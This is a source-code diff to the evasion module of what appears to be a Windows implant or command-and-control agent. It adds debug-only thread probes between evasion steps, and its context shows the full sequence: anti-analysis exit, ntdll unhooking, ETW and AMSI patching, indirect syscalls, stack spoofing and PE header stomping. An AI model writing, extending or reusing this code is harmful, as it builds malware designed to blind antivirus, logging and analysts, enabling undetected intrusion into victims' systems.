@@ -479,10 +479,31 @@ BOOL evasion_stomp_pe_headers(void) {
 #endif
 }
 
+/* ─── Thread-creation probe (debug builds only) ─── */
+#if CONFIG_DEBUG
+static DWORD WINAPI _evasion_test_thread(LPVOID p) { (void)p; return 42; }
+
+static void _probe_threads(const char *after_step) {
+    HANDLE h = CreateThread(NULL, 0, _evasion_test_thread, NULL, 0, NULL);
+    if (h) {
+        WaitForSingleObject(h, 2000);
+        CloseHandle(h);
+        DBG("[evasion] thread probe OK after %s", after_step);
+    } else {
+        DBG("[evasion] thread probe FAILED after %s (err=%u)", after_step, GetLastError());
+    }
+}
+#define PROBE(step) _probe_threads(step)
+#else
+#define PROBE(step) ((void)0)
+#endif
+
 BOOL evasion_init(void) {
     /* Load-time: anti-analysis (exits agent if detected) */
     if (!anti_analysis_check())
         return FALSE;
+
+    PROBE("anti_analysis");
 
     /* Run-time patches — order matters:
      * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
@@ -494,14 +515,17 @@ BOOL evasion_init(void) {
      */
 #if CONFIG_UNHOOK_NTDLL
     evasion_unhook_ntdll();
+    PROBE("unhook_ntdll");
 #endif
 
 #if CONFIG_PATCH_ETW
     evasion_patch_etw();
+    PROBE("patch_etw");
 #endif
 
 #if CONFIG_PATCH_AMSI
     evasion_patch_amsi();
+    PROBE("patch_amsi");
 #endif
 
 #if CONFIG_INDIRECT_SYSCALLS
@@ -509,15 +533,18 @@ BOOL evasion_init(void) {
         /* Some syscalls failed to resolve — non-fatal, continue */
     }
     sw_init();
+    PROBE("indirect_syscalls");
 #endif
 
 #if CONFIG_STACK_SPOOF
     spoof_init();
+    PROBE("stack_spoof");
 #endif
 
     /* PE stomp must be LAST — after all code that reads PE headers */
 #if CONFIG_PE_STOMP
     evasion_stomp_pe_headers();
+    PROBE("pe_stomp");
 #endif
 
     return TRUE;
